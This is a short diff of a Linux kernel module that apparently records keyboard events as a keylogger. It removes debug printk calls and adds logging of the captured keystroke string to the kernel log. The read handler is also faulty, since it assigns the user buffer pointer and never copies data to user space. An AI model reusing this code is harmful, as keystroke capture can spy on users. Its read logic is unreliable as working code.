@@ -45,10 +45,8 @@ static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, lo
 
 		temp_str = event_to_str(*entry);
 		output_str = strcat(output_str, temp_str);
-		printk("%s\n", output_str);
 		// kfree(temp_str);
 		head_ptr = head_ptr->next;
-		printk("headptr is now %p\n", head_ptr);
 	} while (head_ptr != &(g_driver->events_head->list));
 
 	// iterates thru linked list and print elements
@@ -62,9 +60,11 @@ static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, lo
 	// 	ptr = ptr->next;
 	// } while (ptr != &(keylogger->list));
 	
-	if (*offset == strlen(output_str)) return 0;
+	if (*offset == strlen(output_str))
+		return 0;
 	buff = output_str;
-	*offset = strlen(output_str); 
+	printk("%s", output_str);
+	*offset = strlen(output_str);
 	return strlen(output_str);
 }
 
